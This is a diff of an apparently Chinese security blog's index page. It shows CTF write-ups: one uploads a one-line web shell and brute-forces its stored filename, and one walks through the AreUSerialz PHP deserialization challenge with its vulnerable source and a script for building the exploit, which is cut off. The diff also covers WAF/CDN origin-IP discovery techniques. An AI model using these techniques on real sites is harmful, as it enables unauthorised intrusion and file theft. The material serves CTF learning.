class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">美国：</span><br><span class="line">　　8.8.8.8 （google公司）</span><br><span class="line">　　8.8.4.4 （google公司）</span><br><span class="line">　　208.67.222.222 （OpenDNS）</span><br><span class="line">　　208.67.220.220 （OpenDNS）</span><br><span class="line">　　165.87.13.129</span><br><span class="line">　　165.87.201.244</span><br><span class="line">　　205.171.3.65</span><br><span class="line">　　205.171.2.65</span><br><span class="line">　　198.41.0.4</span><br><span class="line">　　198.41.0.4</span><br><span class="line">　　198.32.64.12</span><br><span class="line">　　192.33.4.12</span><br><span class="line">　　192.203.230.10</span><br><span class="line">　　192.5.5.241</span><br><span class="line">　　192.112.36.4</span><br><span class="line">　　192.36.148.17</span><br><span class="line">　　192.58.128.30</span><br><span class="line">　　192.9.9.3</span><br><span class="line">　　193.0.14.129</span><br><span class="line">　　128.9.0.107</span><br><span class="line">　　128.8.10.90</span><br><span class="line">　　66.33.206.206.</span><br><span class="line">　　208.96.10.221</span><br><span class="line">　　66.33.216.216</span><br><span class="line">　　205.171.3.65</span><br><span class="line">　　205.171.2.65</span><br><span class="line">　　165.87.13.129</span><br><span class="line">　　165.87.201.244</span><br><span class="line">加拿大：</span><br><span class="line">　　209.166.160.36</span><br><span class="line">　　209.166.160.132</span><br><span class="line"></span><br><span class="line">英国：</span><br><span class="line">　　193.0.14.129</span><br><span class="line"></span><br><span class="line">日本</span><br><span class="line">　　202.12.27.33</span><br><span class="line">　　202.216.228.18</span><br><span class="line"></span><br><span class="line">韩国：</span><br><span class="line">　　164.124.101.31</span><br><span class="line">　　203.248.240.31</span><br><span class="line">　　168.126.63.60</span><br><span class="line">　　168.126.63.61</span><br><span class="line"></span><br><span class="line">新西兰：</span><br><span class="line">　　202.27.184.3</span><br><span class="line"></span><br><span class="line">泰国：</span><br><span class="line">　　209.166.160.132</span><br><span class="line">　　202.44.8.34</span><br><span class="line">　　202.44.8.2</span><br><span class="line"></span><br><span class="line">印度：</span><br><span class="line">　　202.138.103.100</span><br><span class="line">　　202.138.96.2</span><br></pre></td></tr></table></figure></p>
+<h3><span id="2查询历史dns解析">2.查询历史dns解析，</span></h3><p>如<a href="https://dnsdb.io/zh-cn/search" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/search</a>，同时我觉得这也是个搜集子域名的好工具，而且子域名也可能和主机在同一个服务器的，结果子域名真实ip泄露后，主域名真实ip也泄露了<br>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a><br><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a><br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a></p>
+<h3><span id="3-邮箱绕过">3. 邮箱绕过</span></h3><p>如注册页面可用邮箱注册<br>显示邮件原文<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20171211180506-c389a8ce-de5a-1.png" alt=""><br><code>Received</code> localhost.localdomain 旁边的ip<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20171211180519-cae0e0d8-de5a-1.png" alt=""><br>访问该ip,看是否是绕过云waf后的真实网站ip.</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">bypass</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/09/26/云waf绕过/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-buuctf-web-wp" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/16/buuctf-web-wp/">buuctf web wp</a>
+    </h1>
+  
+
+        
+        <a href="/2020/09/16/buuctf-web-wp/" class="archive-article-date">
+  	<time datetime="2020-09-16T13:19:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[toc]</p>
+<p>##</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/09/16/buuctf-web-wp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctfhub-web-wp" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/16/ctfhub-web-wp/">ctfhub web wp</a>
+    </h1>
+  
+
+        
+        <a href="/2020/09/16/ctfhub-web-wp/" class="archive-article-date">
+  	<time datetime="2020-09-16T12:48:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[toc]</p>
+<h2><span id="uploadddd-2017-赛客夏令营-web-uploadddd">Uploadddd (2017-赛客夏令营-Web-Uploadddd)</span></h2><p>进入题目<br>上传个一句话，没有任何限制，直接上传成功。但是不知道存储路径，访问不到，看来不是考绕过姿势。<br><img src="https://i.loli.net/2020/09/16/ItEU4YcD9OrMXKn.png" alt="image.png"><br>扫一下 发现<code>.index.php.swp</code><br><img src="https://i.loli.net/2020/09/16/nQ7qesY3rxEgvb8.png" alt="image.png"><br><code>vim -r .index.php.swp</code><br>获取上传功能的源代码<br>将上传的文件重命名后放到<code>uploads/</code>路径下<br>重命名规则为 <code>年月日时分秒+随机三位数</code><br><img src="https://i.loli.net/2020/09/16/KRLzBns4lybHItf.png" alt="image.png"><br>注意返回的时间，服务器时间不是标准的北京时间，文件名要用这个时间。<br><img src="https://i.loli.net/2020/09/16/IBDrh2YTpN5eqW8.png" alt="image.png"><br>构造文件名后用burpsuite的intruder进行，进行爆破。<br><img src="https://i.loli.net/2020/09/16/hwXovr5VK2tWFaY.png" alt="image.png"><br>获取文件名<br><img src="https://i.loli.net/2020/09/16/ClTQw4pEMFW6bfV.png" alt="image.png"><br>用蚂剑连上 flag在根目录下<br><img src="https://i.loli.net/2020/09/16/crXpEBKSUk8GR2a.png" alt="image.png"><br><img src="https://i.loli.net/2020/09/16/eFOQ5jS1yqI4AYM.png" alt="image.png"></p>
+<p>这个难度8.3感觉有点虚高。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/09/16/ctfhub-web-wp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-xss-payload" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
@@ -607,951 +1116,6 @@
 
 
   
-    <article id="post-web思维导图" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/29/web思维导图/">web思维导图</a>
-    </h1>
-  
-
-        
-        <a href="/2020/07/29/web思维导图/" class="archive-article-date">
-  	<time datetime="2020-07-29T14:36:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="https://i.loli.net/2020/07/29/VM713ZH8azUhEfF.jpg" alt=""></p>
-<p><img src="https://i.loli.net/2020/07/29/6kF5aPRfJZObV4m.png" alt="Web思路整理.png"></p>
-<p>代码审计<br><img src="https://i.loli.net/2020/07/29/TLorPVtINzxdSZR.png" alt="代码审计.png"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">思维导图</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/07/29/web思维导图/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-网鼎杯-青龙组-web" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/20/网鼎杯-青龙组-web/">网鼎杯 青龙组 web</a>
-    </h1>
-  
-
-        
-        <a href="/2020/06/20/网鼎杯-青龙组-web/" class="archive-article-date">
-  	<time datetime="2020-06-20T05:52:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>[!toc]</p>
-<h2><span id="areuserialz">AreUSerialz</span></h2><p>题目<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>分析代码<br>GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化。</p>
-<p>在反序列化过程中，调用__destruct析构方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>注意 op === “2” 这里用的是强类型比较<br>同时将content赋空值，进入process函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">        $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>进入process函数后 如果op==”1”，则进入write函数，若op==”2”，则进入read函数，否则输出报错。<br>这里用的是弱类型比较 ==<br>所以，令op=2，（int）<br>当op=2，op===”2” 为false，op==”2”为true，接着进入read函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $res = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">        $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>filename可控，接着使用file_get_content函数读取文件。可用php://filter伪协议读取文件，然后用output函数输出<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>注意点:$op,$filename,$content三个变量都是protected,而protect变量在序列化时会有%00%00字符，%00的ASCII码为0，无法通过is_valid函数校验</p>
-<p>绕过方式<br>在本地序列号时将属性改为public（php7.1+版本对属性类型不敏感）<br>即<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">public</span> $content;</span><br></pre></td></tr></table></figure></p>
-<p>本地<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"flag.php"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    